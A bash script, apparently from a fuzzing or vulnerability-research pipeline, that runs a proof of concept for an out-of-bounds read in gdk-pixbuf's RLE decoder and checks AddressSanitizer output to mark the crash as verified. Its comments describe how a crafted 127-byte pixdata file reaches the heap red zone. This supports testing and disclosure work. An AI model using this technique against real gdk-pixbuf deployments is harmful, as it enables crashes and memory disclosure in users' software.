#!/bin/bash
# PoC runner for VULN-002: Out-of-Bounds Read in RLE Decoder (missing rle_buffer bounds check)
# Vulnerability: gdk-pixbuf/gdk-pixbuf/gdk-pixdata.c, lines 459-494
# Function: gdk_pixbuf_from_pixdata()
#
# Strategy: craft a 127-byte GdkPixdata file (.gdkp) that triggers an ASAN heap-buffer-overflow
# READ in the RLE decoder loop.  GLib's GString initial allocation is 128 bytes; after
# accumulating the 127-byte file the null terminator sits at str[127] and str[128] is the
# ASAN red zone.  Carefully-crafted RLE data (25 repeat-1-pixel runs + partial literal) drive
# rle_buffer exactly to str[128] while image_buffer is still below image_limit.

set -o pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf-pixdata_c"
BINARY="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata"
LOADERS_CACHE="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/lib/gdk-pixbuf-2.0/2.10.0/loaders.cache"
# .gdkp extension + GdkP magic bytes make gdk-pixbuf route to the io-pixdata loader
INPUT_BASE="$POC_DIR/vuln_002.pixdata"
INPUT_GDKP="$POC_DIR/vuln_002.gdkp"
OUTPUT="$POC_DIR/vuln_002_out.pixdata"

echo "[*] Generating malicious GdkPixdata file..."
python3 "$POC_DIR/vuln_002_gen.py"

if [ ! -f "$INPUT_BASE" ]; then
    echo "ERROR: Failed to generate $INPUT_BASE"
    echo "ERROR" > "$POC_DIR/vuln_002_status.txt"
    exit 1
fi

# Copy with .gdkp extension so gdk-pixbuf detects it as GdkPixdata format via magic bytes
cp "$INPUT_BASE" "$INPUT_GDKP"

echo "[*] Running binary with ASAN (input: $INPUT_GDKP)..."
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan_002.log:halt_on_error=0" \
  GDK_PIXBUF_MODULE_FILE="$LOADERS_CACHE" \
  "$BINARY" "$INPUT_GDKP" "$OUTPUT" \
  > "$POC_DIR/vuln_002_result.txt" 2>&1 || true

echo "[*] Checking for crash indicators..."
CRASH=0

# Check combined output + any ASAN log files
for f in "$POC_DIR/vuln_002_result.txt" "$POC_DIR"/asan_002.log.*; do
    if [ -f "$f" ]; then
        if grep -qE "ERROR|heap-buffer-overflow|SEGV|runtime error|AddressSanitizer|stack-buffer-overflow|heap-use-after-free|abort|signal" "$f" 2>/dev/null; then
            CRASH=1
            echo "[!] Crash/ASAN evidence found in: $f"
            grep -E "ERROR|heap-buffer-overflow|SEGV|READ|WRITE|AddressSanitizer|SUMMARY" "$f" 2>/dev/null | head -15
        fi
    fi
done

if [ "$CRASH" -eq 1 ]; then
    echo "VERIFIED_CRASH" > "$POC_DIR/vuln_002_status.txt"
    echo "[+] Status: VERIFIED_CRASH"
else
    echo "[*] No crash signal found; result output:"
    cat "$POC_DIR/vuln_002_result.txt" 2>/dev/null || true
    echo "UNVERIFIED" > "$POC_DIR/vuln_002_status.txt"
    echo "[-] Status: UNVERIFIED"
fi

echo "[*] Done. Status written to $POC_DIR/vuln_002_status.txt"
